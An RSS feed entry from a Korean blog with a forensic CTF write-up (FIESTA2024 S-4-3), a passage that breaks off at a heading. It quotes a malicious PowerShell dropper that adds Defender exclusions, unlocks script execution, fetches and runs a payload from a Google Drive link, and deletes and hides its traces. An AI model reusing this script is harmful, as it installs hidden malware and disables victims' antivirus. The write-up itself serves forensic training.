<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>TouBVa</title>
    <description>Harder than you thought, easier than you expected</description>
    <link>https://touBVa.github.io/</link>
    <atom:link href="https://touBVa.github.io/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Wed, 29 Jan 2025 02:11:02 -0600</pubDate>
    <lastBuildDate>Wed, 29 Jan 2025 02:11:02 -0600</lastBuildDate>
    <generator>Jekyll v4.2.2</generator>

    
      <item>
        <title>FIESTA2024 S-4-3 풀이</title>
        <description>
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1&quot;&gt;FIESTA2024 S-4-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2&quot;&gt;FIESTA2024 S-4-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3&quot;&gt;FIESTA2024 S-4-3&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;문제&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;유출된 파일 이름&lt;/p&gt;

  &lt;p&gt;Flag 형식 = FIESTA{(MD5SUM)}&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;유출된 파일의 MD5SUM값을 입력해야 합니다.&lt;/li&gt;
    &lt;li&gt;해쉬값은 대문자입니다.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;S-4-1에서 쉘스크립트가 실행된 것을 보았다.&lt;/p&gt;

&lt;p&gt;해당 스크립트는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 시스템 경로 예외 추가&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Add-MpPreference&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ExclusionPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Windows\System32&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# PowerShell 실행 정책 설정&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$executionPolicyPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKLM:\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$executionPolicyValue&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Unrestricted&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Set-ItemProperty&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$executionPolicyPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ExecutionPolicy&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Value&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$executionPolicyValue&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 압축 라이브러리 추가&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Add-Type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AssemblyName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.IO.Compression.FileSystem&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 인터넷 연결 테스트 함수&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Test-InternetConnection&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Net.WebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://www.google.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Timeout&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HEAD&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$false&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 기본 디렉터리 생성 함수&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Create-BaseDirectory&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$directoryPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Test-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$directoryPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ItemType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$directoryPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[+] Base Directory Created&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[!] Base Directory Already Exists&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 예외 경로 추가&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Add-MpPreference&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ExclusionPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 파일 다운로드 함수&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Download-File&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://www.7-zip.org/a/7z2401-x64.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dest1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\7z.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://drive.usercontent.google.com/u/0/uc?id=1OvkcHZnQd91akAGdaQLNWU_HxjNvv9Hl&amp;amp;export=download&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dest2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\mail.zip&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.WebClient&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DownloadFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dest1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DownloadFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dest2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[+] Success Download&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 압축 해제 함수&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;PWUnzip&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$install7z&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\7z.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zipFilePath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\mail.zip&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$7zipPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\7-Zip\7z.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 7-Zip 설치 및 압축 해제&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Start-Process&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$install7z&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/S&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wait&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-PassThru&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$7zipPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zipFilePath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mv&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 파일 숨기기 및 정리 함수&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Hide-Action&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Remove-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\mail.zip&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Remove-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\7z.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Remove-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\torden\Downloads\mail helper.zip&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Remove-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Recurse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\torden\Downloads\mail helper&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$End_Task&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$End_Task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Attributes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Hidden&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[+] Success Hidden_Action&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 메인 실행 흐름&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Create-BaseDirectory&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Test-InternetConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Download-File&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PWUnzip&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Hide-Action&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 작업 디렉터리 이동 및 스크립트 실행&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\rc&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.\system.ps1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 디렉토리에 가보니 두 개의 파일이 있었음음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;system.ps1&lt;/strong&gt;&lt;/p&gt;

